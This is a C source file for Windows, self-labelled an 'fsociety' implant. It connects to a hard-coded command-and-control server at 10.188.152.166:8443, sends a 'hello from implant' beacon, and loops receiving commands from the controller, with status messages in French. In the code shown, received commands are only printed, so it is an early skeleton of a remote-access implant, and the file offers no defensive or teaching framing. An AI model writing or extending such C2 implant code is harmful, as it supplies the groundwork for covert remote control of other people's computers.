#include "comm.h"

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char **argv)
{
    const char *host = "10.188.152.166";
    uint16_t port = 8443;

    printf("========================================\n");
    printf("  fsociety — Implant\n");
    printf("========================================\n\n");

    if (argc >= 2) host = argv[1];
    if (argc >= 3) port = (uint16_t)atoi(argv[2]);

    if (fso_conn_init() != 0) {
        return 1;
    }

    fso_conn_t conn;
    if (fso_conn_connect(&conn, host, port) != 0) {
        fprintf(stderr, "[-] Échec connexion au C2\n");
        fso_conn_cleanup();
        return 1;
    }

    const char *hello = "hello from implant\n";
    fso_conn_send(&conn, hello, strlen(hello));

    printf("[*] En attente de commandes du C2...\n");

    char buf[FSO_CONN_RECV_BUF];   /* ← déclaration */

    while (conn.connected) {
        int n = fso_conn_recv(&conn, buf, sizeof(buf) - 1);

        if (n == 0) {
            printf("[-] C2 a fermé la connexion\n");
            break;
        }
        if (n < 0) {
            printf("[-] Erreur de réception\n");
            break;
        }

        buf[n] = '\0';
        printf("[C2] %s\n", buf);
    }

    printf("[*] Déconnexion\n");
    fso_conn_close(&conn);
    fso_conn_cleanup();

    return 0;
}